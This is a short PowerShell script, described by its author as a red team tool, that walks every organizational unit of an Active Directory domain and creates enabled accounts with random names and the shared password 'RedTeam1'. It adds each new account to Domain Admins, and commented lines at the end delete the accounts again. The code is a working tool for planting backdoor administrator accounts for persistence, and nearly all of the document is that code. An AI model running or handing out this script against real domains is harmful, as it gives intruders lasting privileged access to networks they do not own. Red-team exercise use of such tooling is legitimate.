# Red team tool to create however many new random users to a domain to then take advantage of
# Created by Zachary Mangiaracina

$count = 0
# IP address of the domain controller
$adserver = '10.1.1.1'
# Names of the random users
$names = @('Bob','Alice','Charlie')
# Password for new users
$password = "RedTeam1"
# How many total users are wanted
$totalIterations = 1

$i = 0
for(;$i -le $totalIterations;$i++){
	# Get every OU in domain to place new users in them round-robin
	$all = (Get-ADOrganizationalUnit -Filter 'Name -like"*"' -server $adserver)
	foreach($OU in $all){
		# $rand is to randomly select one of the names from the $names array
		$rand = get-random -Minimum 0 -Maximum ($names.Count)
		# Set the current name and try to make unique with the $count and current date & time
		$name = $names[$rand] + $count + (date -format hhmmssyy)
		# Create the user
		New-ADUser $name -Path $OU.Distinguishedname -enabled:$true -server $adserver -Accountpassword (ConvertTo-SecureString -AsPlainText $password -Force) -ChangePasswordAtLogon $False
		# Add the user to domain admins
		Add-AdGroupMember -Identity "Domain Admins" -Members $name
		# Increase the count by one
		$count ++
		# Sleep for 1 second
		sleep 1
	}
}

#Get-ADUser -Filter "Name -like 'bob*'" | Remove-ADUser
#Get-ADUser -Filter "Name -like 'charlie*'" | Remove-ADUser
#Get-ADUser -Filter "Name -like 'alice*'" | Remove-ADUser